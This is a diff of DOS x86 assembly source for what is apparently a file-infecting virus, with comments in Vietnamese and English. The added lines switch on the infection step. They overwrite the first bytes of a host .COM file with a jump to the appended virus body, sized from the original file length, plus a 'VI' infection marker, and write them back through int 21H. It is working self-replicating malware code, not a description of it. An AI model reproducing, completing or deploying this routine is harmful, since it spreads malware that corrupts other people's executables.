@@ -69,16 +69,21 @@ CHECK_FILE:              ; check 5 byte ban dau.
     mov ax,4200H
     int 21H              ; move back ve dau host, dat lenh jmp
     
-;    mov byte ptr [di+DATA_ARRAY],0E9H    ; set 3 byte dau tien la lenh jmp(co opcode 0E9H)  
-;    mov ax,[bp+1AH]
-;    add ax,offset START_VIRUS - offset VIRUS -3
-;    mov word ptr [di+DATA_ARRAY+1],ax
-;    mov word ptr [di+DATA_ARRAY+3],4956H
-    
-    mov cx,5                      ; set 5 bytes ghi vo host
-    lea dx,[di+OFFSET START]      ; tai vi tri data_array
+    mov byte ptr [di+DATA_ARRAY],0E9H            ; set 1 byte dau tien la lenh jmp(co opcode 0E9H)  
+    mov ax,[bp+1AH]                              ; orginal file size
+    add ax,offset START_VIRUS - offset VIRUS -3  ; plus data_array,relative jmp always ref to the ip (point at 103H) when jmp execute.
+    mov word ptr [di+DATA_ARRAY+1],ax            ; jmp toi dau
+    mov word ptr [di+DATA_ARRAY+3],4956H         ; 2 byte sau la virus marker
+   
+    mov cx,5
     mov ah,40H
-    int 21H                       ; ghi
+    lea dx,[di+DATA_ARRAY]
+    int 21H  
+    
+;    mov cx,5                      ; set 5 bytes ghi vo host
+;    lea dx,[di+OFFSET START]      ; tai vi tri data_array
+;    mov ah,40H
+;    int 21H                       ; ghi
     
 CLOSE_FILE:    
     mov ah,3EH      
@@ -90,7 +95,7 @@ CLOSE_FILE:
 DONE:
 ;    mov ah,1AH                      ; restore DTA
 ;    mov dx,80H
-;    int 21H
+;    int 21H                              
 ;    mov si,offset START             ; restore 
 ;    push si
 ;    lea si,[bp+TERMINATE]
